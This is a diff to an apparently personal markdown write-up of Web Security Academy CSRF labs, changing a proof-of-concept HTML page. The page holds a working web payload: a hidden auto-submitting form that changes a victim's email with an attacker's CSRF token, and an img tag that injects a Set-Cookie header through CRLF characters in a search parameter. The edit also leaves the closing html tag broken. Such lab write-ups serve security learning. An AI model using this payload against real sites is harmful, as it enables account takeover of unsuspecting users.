@@ -70,15 +70,15 @@ one for session handling and one for CSRF protection, which are not integrated t
 <!-- Cookie csrfKey works as session ID here. It's app weakness. -->
 <html>
   <body>
-    <form action="https://acd41f251facd65c80122553008d00c5.web-security-academy.net/email/change" method="POST">
+    <form action="https://ac131f731e467c88807003ba01eb0021.web-security-academy.net/email/change" method="POST">
       <!-- Attacker's token -->
-      <input required type="hidden" name="csrf" value="nwA4aBrVat0amHXA9Z6nfo8coPU8JhWK"/>
-      <input type="hidden" name="email" value="pwned@evil-user.net" />
+      <input required type="hidden" name="csrf" value="YKm0bbE4NCHbFlmEt77LfeZPzlSLYY5r"/>
+      <input type="hidden" name="email" value="test@meme.com" />
     </form>
     <!-- Vulnerability which allows an attacker to inject a cookie to victim.  -->
-    <img src="https://acd41f251facd65c80122553008d00c5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=kE4no0fY9JeJvK9KSGzoZrIYZ7PTubzQ" onerror="document.forms[0].submit()">
+    <img src="https://ac131f731e467c88807003ba01eb0021.web-security-academy.net//?search=test%0d%0aSet-Cookie:%20csrfKey=kE4no0fY9JeJvK9KSGzoZrIYZ7PTubzQ" onerror="document.forms[0].submit()">
   </body>
-</html>
+</html
 ```
 
 ## CSRF where token is duplicated in cookie
